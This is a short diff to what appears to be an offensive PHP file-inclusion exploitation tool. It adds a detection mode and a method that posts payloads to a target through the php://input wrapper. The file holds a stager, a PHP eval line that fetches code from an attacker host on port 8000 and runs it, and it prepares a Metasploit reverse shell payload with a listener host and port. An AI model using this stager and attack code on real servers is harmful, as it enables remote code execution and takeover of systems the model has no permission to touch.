@@ -3,17 +3,34 @@ from os.path import abspath, dirname, join
 
 from .utils import listener, attack, colors, cook, msf_payload
 
+from .Detection import Detection
+
 STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
 HERE = abspath(dirname(__file__))
 
 class Input:
-    def __init__(self, target, nostager, cookies):
+    def __init__(self, args):
 
-        self.target = target
-        self.nostager = nostager
-        self.cookies = cookies
+        self.target = args.url
+        self.nostager = args.nostager
+        self.cookies = args.cookies
+        self.detection = args.detection
+
+    def attack(self, payload):
+        wrapper = "php://input"
+
+        if self.cookies:
+            cookies = cook(self.cookies)
+            response = attack(self.target, wrapper, cookies=cookies, data=payload)
+        else:
+            response = attack(self.target, wrapper, data=payload)
+        return response
 
     def execute_input(self):
+        if self.detection:
+            detector = Detection(self)
+            detector.detect()
+            return
 
         lhost, lport, shell = msf_payload()
         wrapper = "php://input"
